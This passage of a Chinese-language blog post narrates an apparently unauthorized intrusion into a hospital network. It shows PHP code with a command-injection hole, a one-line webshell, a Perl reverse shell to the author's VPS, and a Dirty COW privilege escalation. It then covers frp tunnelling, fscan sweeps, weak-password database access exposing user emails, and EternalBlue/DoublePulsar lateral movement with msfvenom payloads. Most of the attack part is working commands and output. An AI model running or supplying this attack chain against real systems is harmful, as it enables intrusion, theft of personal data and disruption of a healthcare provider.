class="variable">$end</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;file: &#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$start_time</span> = gmdate(<span class="string">&quot;H:i:s&quot;</span>, <span class="variable">$start</span>);</span><br><span class="line">	<span class="variable">$duration_time</span> = gmdate(<span class="string">&quot;H:i:s&quot;</span>, <span class="variable">$end</span>-<span class="variable">$start</span>);	</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$output_file</span> = <span class="string">&#x27;/var/www&#x27;</span>.str_replace(<span class="string">&#x27;.mp4&#x27;</span>,<span class="string">&#x27;_&#x27;</span>.time().<span class="string">&#x27;.mp4&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;output: &#x27;</span>.<span class="variable">$output_file</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="variable">$cmd</span> = <span class="string">&#x27;ffmpeg -ss &#x27;</span>.<span class="variable">$start_time</span>.<span class="string">&#x27; -t &#x27;</span>.<span class="variable">$duration_time</span>.<span class="string">&#x27; -vcodec copy -acodec copy -i /var/www&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$output_file</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	exec( <span class="variable">$cmd</span>.<span class="string">&#x27; 2&gt;&amp;1&#x27;</span>, <span class="variable">$output</span> );</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	print_r(<span class="variable">$output</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>首先是接收了这四个参数，<code>studyUID</code>,<code>start</code>,<code>end</code>,<code>file</code>。可以看到下面的cmd变量，代码中直接将接收到的参数拼接到output_file变量中了，虽然有个<code>str_replace</code>函数，但是并不影响，因为我们的<code>file</code>变量中没有.mp4去给函数进行替换，所以就直接将<code>file</code>拼接到<code>output_file</code>变量中了，<code>output_file</code>变量是放在cmd变量最后的，而且没有经过任何过滤传入exec函数中。</p>
<p>那么这个时候就可用linux分号来分割命令，实现rce。除了分号当然也可以用||，&amp;&amp;等等，但是分号是顺序地独立执行各条命令, 彼此之间不关心是否失败, 所有命令都会执行。</p>
<h2 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h2><p>我最开始拿到这样一个rce的时候，最先想到的是通过命令写入一句话木马，用哥斯拉或者是其他的webshell管理工具，方便后续的操作。</p>
<p><code>echo &#39;&lt;? php @eval($_POST[&quot;x&quot;]); ?&gt;&#39; &gt;xiaomaomi.php</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212213224258.png" alt="image-20230212213224258"></p>
<p>这里可以看到，我们的小猫咪木马确实是写进去了的。但是访问的时候却解析为500.</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212213255376.png" alt="image-20230212213255376"></p>
<p>我尝试过使用市面上的一些简易免杀版本，同样为500。让我不得不怀疑，这个机器上面存在杀软。</p>
<p>而且我尝试访问过当前目录下的其他php文件，是确实解析了。</p>
<p>甚至cat也能看到文件中的内容</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212213536297.png" alt="image-20230212213536297"></p>
<p>但是xiaomaomi就是不执行。我尝试过比较大的免杀马，但是却有url长度的限制，导致无法写入。</p>
<h2 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h2><p>当我无法上传木马的时候，我的思路是反弹一个会话，不管是nc也好，msf也好。我都可以更方便的操作。</p>
<p>于是开启了我的花生壳对我的kali虚拟机进行了一个内网穿透，开了个nc监听。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212220132263.png" alt="image-20230212220132263"></p>
<p>但是都没有什么实质性的进展，最后那个whoami是我用自己的服务器实验了一下内网穿透，就是酱紫。</p>
<p>我把几乎能用到的反弹shell的命令几乎都用上了，就是弹不回来</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212220453965.png" alt="image-20230212220453965"></p>
<p>我怀疑也是防火墙的出网策略或者是杀软搞的鬼。（后来我想可能是php函数的问题，有知道的师傅可以解释一波）</p>
<p>尝试pingdnslog，确定机器确实是出网的</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212220928123.png" alt="image-20230212220928123"></p>
<h2 id="尝试3（成功）"><a href="#尝试3（成功）" class="headerlink" title="尝试3（成功）"></a>尝试3（成功）</h2><p>思路回到了上传木马的地方，我不能肯定是不是这些webshell的问题，既然命令写不进去，那我们就放到vps上让服务器去主动下载。</p>
<p>那我们拿自己的vps开一个http服务。</p>
<p>这边开http服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install python3 python3-pip</span><br><span class="line">pip3 install simplefileserver</span><br><span class="line">simplefileserver 8989 </span><br><span class="line">随后访问你的vps的8989端口就可以</span><br></pre></td></tr></table></figure>

<p>然后wget上传大马</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230212222541392.png" alt="image-20230212222541392"></p>
<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><p>既然是一个医院的系统，我想应该会有内网吧。</p>
<p>不管是不是内网，我们现在的权限还不是root</p>
<p>先看看这个机器的内核版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux ecsprod-oldbackup 3.2.0-4-amd64 #1 SMP Debian 3.2.57-3+deb7u1 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">是3.2.0-4-amd64</span><br></pre></td></tr></table></figure>

<p>而且我还扫了一下这儿ip的端口，发现22端口居然没开，我本来打算加密钥直接上ssh的，没开22就算了吧，还是先弹个shell回来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;vpsip&quot;;$p=35932;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>

<p>msf打开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  cmd/unix/reverse_bash</span><br><span class="line">set lport  7777</span><br><span class="line">set lhost  172.16.1.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>这次用大妈就弹成功了(我试过的，只有大妈能弹，用之前rce漏洞弹不了)，再次给kali内网穿透，得到一个msf会话。</p>
<p>我看这个版本的linux应该是可以用脏牛的，现在就试试</p>
<p>这是github上面脏牛的exp</p>
<p><code>https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c</code></p>
<p>直接给他wget到tmp目录下面</p>
<p>然后编译<code>gcc -pthread dirty.c -o dirty -lcrypy</code></p>
<p>但是编译的时候，提示没有相关动态库，而且，我还发现了一个问题。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213000743643.png" alt="image-20230213000743643"></p>
<p>上面是提示没有动态库，于是决定换一个exp</p>
<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>换了个exp，顺便用nc在我的vps上弹了个会话（msf有点卡）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">提前换成交互式shell</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213004422893.png" alt="image-20230213004422893"></p>
<p><code>wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c</code></p>
<p><code>gcc -pthread dirty.c -o dirty -lcrypt</code>编译一下</p>
<p><code>./dirty 123456</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213004538455.png" alt="image-20230213004538455"></p>
<p>等待提权成功</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213004917209.png" alt="image-20230213004917209"></p>
<p>提权成功了！</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213005306922.png" alt="image-20230213005306922"></p>
<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="资产探测"><a href="#资产探测" class="headerlink" title="资产探测"></a>资产探测</h3><p>暂且不管是不是虚拟机，我们arp -a看看</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213172555433.png" alt="image-20230213172555433"></p>
<p>貌似还有4台机器啊</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也就是说这个网段里面加上我拿下的这台机器，一共有5台机器</span><br><span class="line">本机192.168.1.70</span><br><span class="line"></span><br><span class="line">另外三台</span><br><span class="line">? (192.168.1.206) at 00:11:32:eb:41:08 [ether] on eth0</span><br><span class="line">? (192.168.1.111) at 00:11:32:ee:80:15 [ether] on eth0</span><br><span class="line">? (192.168.1.105) at 00:0c:29:31:da:67 [ether] on eth0</span><br><span class="line">DSR-1000AC (192.168.1.1) at f0:b4:d2:23:d3:67 [ether] on eth0</span><br><span class="line">（其中105是第二天出现的，第一天我没看到）</span><br></pre></td></tr></table></figure>

<p>这里我顺便看了看，这个名为DSR-1000AC的机器是路由器。（找了一下没发现路由器的漏洞）</p>
<p>这里先进行存活网段的探测,使用的工具名为netspy，github上面搜得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 ./netspy</span><br><span class="line">./netspy -x is #注：急速模式协程数量为cpu核数*40，只探测段内网关。</span><br></pre></td></tr></table></figure>

<p>以下是扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./netspy -x is</span><br><span class="line">[INFO] 2023/02/13 11:40 use icmp protocol to spy</span><br><span class="line">[INFO] 2023/02/13 11:40 192.168.0.0/16 is from 192.168.0.0 to 192.168.255.255</span><br><span class="line">[INFO] 2023/02/13 11:40 172.16.0.0/12 is from 172.16.0.0 to 172.31.255.255</span><br><span class="line">[INFO] 2023/02/13 11:40 10.0.0.0/8 is from 10.0.0.0 to 10.255.255.255</span><br><span class="line">2023/02/13 11:40 192.168.1.1/24</span><br><span class="line">2023/02/13 11:40 192.168.0.1/24</span><br><span class="line">2023/02/13 11:40 192.168.5.1/24</span><br><span class="line">2023/02/13 11:40 192.168.215.1/24</span><br></pre></td></tr></table></figure>

<p>大概也就是这四个存活网段<code>1\0\5\215</code></p>
<p>然后上fscan，开扫。（由于爆破ftp服务会让fscan卡住，我们就不要爆破ftp了）这些服务的密码我后续来爆破。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./fscan_amd64 -h 192.168.1.1/24 -nobr -o 1.txt</span><br><span class="line">./fscan_amd64 -h 192.168.0.1/24 -nobr -o 0.txt</span><br><span class="line">./fscan_amd64 -h 192.168.5.1/24 -nobr -o 5.txt</span><br><span class="line">./fscan_amd64 -h 192.168.215.1/24 -nobr -o 215.txt</span><br></pre></td></tr></table></figure>

<p>拿到输出结果之后，我们用这个工具优化一下输出结果。<code>fscanOutput</code></p>
<p>扫描结果大致如下，因为我们使用了nobr参数，就导致了不会检测漏洞，我之前扫的时候检测到了ms17010,但是因为爆破ftp卡住了。</p>
<p>后面我们单独列一个表来给fscan跑，之前跑的大部分如下</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215105594.png" alt="image-20230213215105594"><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215111766.png" alt="image-20230213215111766"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215121812.png" alt="image-20230213215121812"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215136148.png" alt="image-20230213215136148"></p>
<p>那其他网段我们暂且不看，我们看看1这个网段的机器。</p>
<p>而且经过观察还可以发现，一共有3个域<code>WORKGROUP,MYGROUP,__MSBROWSE__</code></p>
<p>然后我们把这些机器的ip导到txt中，穿上去再用fscan扫一遍</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213215826502.png" alt="image-20230213215826502"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./fscan_amd64 -hf ta.txt -o all.txt</span><br></pre></td></tr></table></figure>

<p>大概扫描结果如下</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230213224256897.png" alt="image-20230213224256897"></p>
<p>二十多台机器，我觉得有两种可能，一种是医院是小医院，一种是这个网里面只有他们对外的服务，没有内部办公电脑。因为我看了一下内部url的title有什么放射学信息系统，还有些其他的，</p>
<h3 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h3><p>首先我们需要将流量代理出来</p>
<p>我们采用frp，先把frpc传到对面这台机器上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 你的攻击机</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line"># 启用加密，防止流量被拦截</span><br><span class="line">use_encryption = true</span><br><span class="line"># 启用压缩，提升流量转发速度</span><br><span class="line">use_compression = true</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>

<p><code>./frpc -c frpc.ini</code>开启服务</p>
<p>然后自己的vps上，也传个frps上去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = vps_ip</span><br><span class="line">server_port = 4444</span><br></pre></td></tr></table></figure>

<p><code>./frps -c frps.ini</code>开启服务，注意现在的socket代理的ip为vps，但是端口为1080</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214011120522.png" alt="image-20230214011120522"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214011226576.png" alt="image-20230214011226576"></p>
<p>搭建成功！</p>
<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>一共探测到3个数据库</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214120834713.png" alt="image-20230214120834713"></p>
<p>其中两个是有弱口令的，而78这台机器，提示如下，我们可以拿下其他机器之后再来试试</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214120725755.png" alt="image-20230214120725755"></p>
<p>另外两个数据，我们是可以直接用fscan扫出来的弱口令登录的。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214120934733.png" alt="image-20230214120934733"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121014276.png" alt="image-20230214121014276"></p>
<p>可以发现里面还是有很多数据的</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121120392.png" alt="image-20230214121120392"></p>
<p>只不过密码被加密了，但是却有邮箱等信息</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121203058.png" alt="image-20230214121203058"></p>
<p>都是法语看不太懂</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214121416784.png" alt="image-20230214121416784"></p>
<h3 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h3><h4 id="尝试1-1"><a href="#尝试1-1" class="headerlink" title="尝试1"></a>尝试1</h4><p>先给各个机器扫了下弱口令</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214132424369.png" alt="image-20230214132424369"></p>
<p>可惜登录不上，原因未知</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214122437992.png" alt="image-20230214122437992"></p>
<p>先拿下这几台ms17-010好吧</p>
<p>先给kali连上我们的隧道</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">改好下方的代理地址</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOST 192.168.1.150</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214152912193.png" alt="image-20230214152912193"></p>
<p>但是没有成功返回会话，或许是win5的原因，我们先攻击那台win7的机器。</p>
<p><code>192.168.1.51</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230214153404421.png" alt="image-20230214153404421"></p>
<p>等待利用成功。很好，又失败了，<code>Exploit completed, but no session was created.</code></p>
<p>推测目标机器不出网，使用<code>set payload windows/x64/meterpreter/bind_tcp</code>这个paload正向打</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217225542792.png" alt="image-20230217225542792"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line"></span><br><span class="line">目标出网时反向打：</span><br><span class="line">msf &gt; set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line"></span><br><span class="line">目标不出网时正向打（如添加了路由）：</span><br><span class="line">msf &gt; set payload windows/x64/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure>

<p>但是同样没有shell弹回来。</p>
<p>==================分割线================================</p>
<p>后续我们采用这个脚本打，实战成功率高。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/projectboot/EternalPuls</span><br></pre></td></tr></table></figure>

<p>这里我们先给msf加一个路由,先把外网的weblinux主机弹一个会话到我们的kali上。</p>
<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=你的穿透 LPORT=你的穿透 -f elf &gt; shell.elf</code></p>
<p>将生成的木马传上去，然后kali开启监听。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.32.108</span><br><span class="line">set lport 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>然后执行木马（记得给执行权限），成功上线msf</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217233610003.png" alt="image-20230217233610003"></p>
<p>添加路由</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.1.70/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<p>开启流量代理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">set srvhost 192.168.32.108</span><br><span class="line">set srvport 10011</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>然后在proxychains中配置好刚才的代理</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217234742108.png" alt="image-20230217234742108"></p>
<p>攻击机上也做好代理，可以把原来的frp代理替换掉</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217234855406.png" alt="image-20230217234855406"></p>
<p>然后就可以用脚本开始打了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 目标IP --TargetPort 445</span><br><span class="line"></span><br><span class="line">Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 192.168.1.51 --TargetPort 445</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217235008559.png" alt="image-20230217235008559"></p>
<p>64位，用msf生成64位的正向payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1125 -f dll -o bind.dll</span><br></pre></td></tr></table></figure>

<p>然后就可以用脚本直接打了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp 目标ip --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload dll地址 --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine &quot;&quot; --NetworkTimeout 60</span><br></pre></td></tr></table></figure>

